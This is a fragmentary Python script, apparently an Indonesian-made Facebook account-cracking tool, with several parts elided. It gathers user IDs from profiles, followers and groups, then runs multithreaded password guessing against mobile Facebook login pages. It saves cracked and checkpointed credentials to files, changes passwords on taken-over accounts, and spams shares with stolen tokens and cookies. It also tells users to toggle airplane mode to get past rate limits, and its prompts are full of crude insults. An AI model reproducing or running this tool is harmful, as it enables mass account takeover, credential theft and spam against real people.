...
try:
        ...
        cetak(nel('\t• Installing the Module Rich •'))
        os.system('pip install rich')
try:
        import stdiomask
except ImportError:
        cetak(nel('\t• Installing the Module Stdiomask •'))
        os.system('pip install stdiomask')
try:
	import requests
except ImportError:
	cetak(nel('\t• Installing the Module Requests •'))
...
def login_lagi334():
	try:
		os.system('clear')
		banner()
		cetak(nel('\t©©© Silent extension : [green]Cookiedough[white] ©©©'))
		...
		print(f'  {x}[{h}•{x}]{h} LOGIN SUCCEED.........!{x} ');time.sleep(1)
		exit()
	except Exception as e:
		os.system("rm -f .token.txt")
		os.system("rm -f .cok.txt")
		print(f'  %s[%sx%s]%s LOGIN FAIL.....CHECK YOUR COOKIE   !!%s'%(x,k,x,m,x))
		exit()
def bot():
	try:
...
def menu(my_name,my_id):
	...
	cetak(nel('\tHappy Come [yellow]%s[white] Ngentod'%(my_name)))
	print(f'├──> Your Idz : '+str(my_id))
	print(f'├──> Your Ip  : {ip}')
	print('|')
	statuscp = f'➤ 1. Crack Publik\n➤ 2. Crack folower\n➤ 3. Report Bug\n➤ 4. Crack File\n➤ 5. Results Crack CP/OK\n➤ 6. Share Postingan Fb\n7. Tes➤ 0. Keluar'
	statuscp1 = nel(statuscp, style='cyan')
	cetak(nel(statuscp1, title='SELECT CRAK'))
	print('|')
	_____Mr__silent_____ = input('\r├──> Select : ')
	if _____Mr__silent_____ in ['1']:
		dump_massal()
	elif _____Mr__silent_____ in ['2']:
		cek_opsi()
	elif _____Mr__silent_____ in ['3']:
		error()
	elif _____Mr__silent_____ in ['4']:
		crack_file()
	elif _____Mr__silent_____ in ['5']:
		result()
	elif _____Mr__silent_____ in ['6']:
		memek()
	elif _____Mr__silent_____ in ['7']:
		log_hasil()
	elif _____Mr__silent_____ in ['0']:
		os.system('rm -rf .token.txt')
		os.system('rm -rf .cookie.txt')
		print('├──> Success Logout+happy Cookies ')
		exit()
	else:
		print('├──> Select Which Correct Asu ')
		back()
def error():
	jalan(f'{sir}├──> wait you will di commuters the Facebook  {x}')
	time.sleep(4)
	...
	if kz in ['2']:
		...
		if len(vin)==0:
			...
			try:geh = lol[geeh]
				...
				print('>> Select Which Correct cock ')
				back()
...
def dump_massal():
	try:
		...
		exit()
	try:
		jum = int(input('├──> Always How much Target Njing ? : '))
	except ValueError:
		print('├──> Enter Number Dog, Even Huruff ')
		exit()
	if jum<1 or jum>100:
		print('├──> Fail Dump Idz ')
		exit()
	...
	for met in range(jum):
		yz+=1
		kl = input('├──> Enter Idz Which When '+str(yz)+' : ')
		uid.append(kl)
	for userr in uid:
		try:
	...
	try:
		print('|')
		print(f'├──> Total Idz Which Collected🔥'+str(len(id)))
		setting()
	except requests.exceptions.ConnectionError:
		print(f'{x}')
		print('├──> Signal Lo kek Kontol ')
		back()
	except (KeyError,IOError):
...
def dump_pengikut():
	try:
		...
		exit()
	print('>> Type ( me ) If Want to Crack Follower Own ')
	...
	try:
		...
		print('>> Connection Internet Problematic ')
		exit()
	except (KeyError,IOError):
...
def lah():
	print(f'\n{x}>> Total Idz The Collected :{h} %s '%(len(id)))
	input(f'{x}>> [ {m}Click Enter {x}] ')
	print('')
	pass
	setting()
def grup():
	print('')
	id = input(f'{x}>> Enter Username Or Idz Group : ')
	...
	try:
		...
		print('>> Signal Loo Kek Kontol ')
		time.sleep(0.5)
		exit()
	berr = gn.find("title")
	berr2 = berr.text.replace(" | Facebook","").replace(" Grup Publik","")
	if berr2=='Enter Facebook':
		print(" Caught Limit, Please Mode Aircraft And Try Again..")
		time.sleep(0.5)
		grup()
	elif berr2=='Error':
		alvino_xy('>> Group Not Of Find ')
		time.sleep(0.5)
		grup()
	else:pass
...
def grup1(urls):
	use = []
	ses = requests.Session()
	print(f'{x}├──> Currently Gather Idz ')
	print(f'├──> Click {k}Ctrl+C{x} For {m}Stop{x} Dump !!')
	while True:
		try:
			#ua = 'Mozilla/5.0 (Linux; Android 4.4.2; Lenovo A7600-F Build/KOT49H) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/30.0.0.0 Safari/537.36'
			miskinlu = {"user-agent": ua}
			...
			for g in bf2:
				css = str(g).split('>')
				if 'Look Posts Other</span' in css:
...
threads = []
def memek():
	print("1. Spam share via token and cookie Of Recommend")
	ask = input("\nSelect : ")
	if ask in["1"]:
		token_cookie()
	...
	try:
		...
		for x in range(limit):
			...
			if 'id' in post:
				...
				exit("Fail share, possibility token invalid")
	except:
		exit("Failed to share, possibility token invalid")
#-------------[ CRACK-FROM-FILE ]------------------#
def crack_file():
	try:vin = os.listdir('SILENT-DUMP/')
	except FileNotFoundError:
		print('>> File Not found ')
		time.sleep(2)
		back()
	if len(vin)==0:
		...
		kontol = input('\n>> is You Understand ( Y/t ) ')
		if kontol in ['']:
			print('>> Choose the Right One ')
		elif kontol in ['y','Y']:
			print(f'\n[{h}√{x}] Alhamdulillah You Very Paint ')
			time.sleep(3)
			back()
		elif kontol in ['t','T']:
			print(f'\n[{k}x{x}] Youre Really Stupid ')
			time.sleep(3)
			exit()
		print('>> You Dont Have File Dump ')
		time.sleep(2)
		back()
	else:
		cih = 0
		lol = {}
		for isi in vin:
			try:hem = open('SILENT-DUMP/'+isi,'r').readlines()
			except:continue
			cih+=1
			if cih<100:
				nom = ''+str(cih)
		...
		try:geh = lol[geeh]
			...
			print(f'{k}├──> Select Which Correct Kontol {x}')
			time.sleep(3)
			back()
		try:lin = open('SILENT-DUMP/'+geh,'r').read().splitlines()
		except:
...
def setting():
	...
	statuscp1 = nel(statuscp, style='cyan')
	cetak(nel(statuscp1, title='SELECT IDZ ACCOUNT'))
	print('|')
	hu = input('├──> Select : ')
	if hu in ['1','01']:
		...
		print('├──> Select Which Correct Kontooll ')
		exit()
		print('|')
	statuscp = f'➤ 1. M-FACEBOOK\n➤ 2. MBASIC FACEBOOK\n➤ 3. TOUCH FACEBOOK\n➤ 4. M-TOUCH FACEBOOK'
	statuscp1 = nel(statuscp, style='cyan')
	cetak(nel(statuscp1, title='SELECT METODE'))
	print('|')
	hc = input('├──> Select : ')
	if hc in ['1','01']:
		method.append('mobile')
	elif hc in ['']:
		print('├──> Select Which Correct Kontol ')
		setting()
	elif hc in ['2','02']:
		method.append('free')
	elif hc in ['3','03']:
...
def passwrd():
	...
	print('|')
	print(f'├──> Results {h}OK{x} Stored Of : {h}result/OK/%s {x}'%(okc))
	print(f'├──> Results {k}CP{x} Stored Of : {k}result/CP/%s {x}'%(cpc))
	print(f'├──> Play Mode Aircraft Each {m}1k{x} Idz\r')
	print('|')
	with tred(max_workers=30) as pool:
		for yuzong in id2:
			...
			if 'mobile' in method:
				...
				pool.submit(crack,idf,pwv)
	print('|')
	cetak(nel('\t[cyan]✓[green] Crack Done Ngab, Dont land Grateful[cyan] ✓[white] '))
	print(f'[{b}•{x}]{h} OK : {h}%s '%(ok))
	print(f'{x}[{b}•{x}]{k} CP : {k}%s{x} '%(cp))
	print('|')
	print('├──>Carry on Crack Return ( Y/t ) ? ')
	woi = input('├──>Select : ')
	if woi in ['y','Y']:
		back()
	else:
...
def ceker(idf,pw):
	...
	try:
		...
		if len(opsi)==0:
			print('\r%s---> Tap Yes / A2F (Check Login With Lite/Mbasic%s)'%(hh,x))
		else:
			for opsii in opsi:
				print('\r%s---> %s%s'%(kk,opsii.text,x))
	except Exception as c:
		print('\r%s++++ %s|%s ----> CP       %s'%(b,idf,pw,x))
		print('\r%s---> Not Could Check Option (Check Login With Lite/Mbasic)%s'%(u,x))
		open('result/CP/'+cpc,'a').write(idf+'|'+pw+'\n')
		cp+=1
# CHEKPOINT DETEDTOR
def log_hasil(user, pasw):
    ...
    if "Find Account You" in re.findall("\<title>(.*?)<\/title>",str(urlPost.text)):
        sys.stdout.write('\r %s[%s!%s] Turn on airplanemode 2 seconds'%(N,M,N)),
    if "c_user" in session.cookies.get_dict():
        if "Account You Locked" in urlPost.text:
        ...
        if(len(cek)==0):
            if "Look detail login which shown. This You?" in title:
                if "y" in ubahP:
                    mmk = pwBaru
                    ...
                    jalan(f"\r [{H}•{N}] Status : {BM}{P}TAP YES{N}");time.sleep(0.03)
                    ubah_pw(session,response,link2,user, mmk)
            elif "Input Code Enter for Continue" in re.findall("\<title>(.*?)<\/title>",str(response)):
...
def cek_opsi():
	c = len(akun)
	hu = 'Be found %s Account For Checked\nBefore Start, Mode Aircraft/Change Together Sim What more first'%(c)
	cetak(nel(hu, title='CHECK OPTION'))
	input(x+'['+h+'•'+x+'] Start')
	cek = '# PROSES CHECK OPTION STARTED'
	...
	for kes in akun:
		try:
			try:
				...
				print('\r%s---> Separator Not Supported For Program Ini%s'%(u,x))
				continue
			bi = random.choice([u,k,kk,b,h,hh])
			...
			if "checkpoint" in ses.cookies.get_dict().keys():
				try:
					...
					print('\r%s++++ %s|%s ----> CP       %s'%(b,id,pw,x))
					print('\r%s---> Not Could Check Opsi%s'%(u,x))
			elif "c_user" in ses.cookies.get_dict().keys():
			...
			print('')
			li = '# CONNECTION INTERNET PROBLEM, CHECK & TRY AGAIN'
...
def cek_apk(session,cookie):
	...
	if len(game)==0:
		print(f"\n {N}[{M}!{N}] opshh no ada application active from account ini.")
	else:
	...
	game = [i.text for i in x.find_all("h3")]
	if len(game)==0:
		print(f"\n {N}[{M}!{N}] opshh no ada application expired from account ini.")
	else:
		for i in range(len(game)):
